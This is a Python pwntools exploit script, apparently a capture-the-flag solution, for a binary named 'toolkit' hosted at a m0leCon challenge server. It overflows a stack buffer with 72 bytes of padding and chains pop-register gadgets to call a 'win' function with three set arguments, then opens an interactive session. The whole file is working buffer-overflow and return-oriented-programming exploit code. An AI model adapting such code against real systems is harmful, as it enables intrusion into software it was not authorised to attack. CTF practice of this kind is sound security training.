#!/usr/bin/env python3
from pwn import *

elf = ELF('./toolkit', checksec=False)
context.binary = elf
context.arch = 'amd64'

HOST = "offsec.m0lecon.it"
PORT = 13573

OFFSET_TO_RIP = 72

a = 0x1111111111111111
b = 0x2222222222222222
c = 0x3333333333333333

def conn():
    if not args.LOCAL:
        return remote(HOST, PORT)
    return process(elf.path)

p = conn()

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(elf.sym.ret_gadget),
    p64(elf.sym.pop_rdi_ret),
    p64(a),
    p64(elf.sym.pop_rsi_ret),
    p64(b),
    p64(elf.sym.pop_rdx_ret),
    p64(c),
    p64(elf.sym.win)
)

p.recvuntil(b'Input:')
p.send(payload)
p.interactive()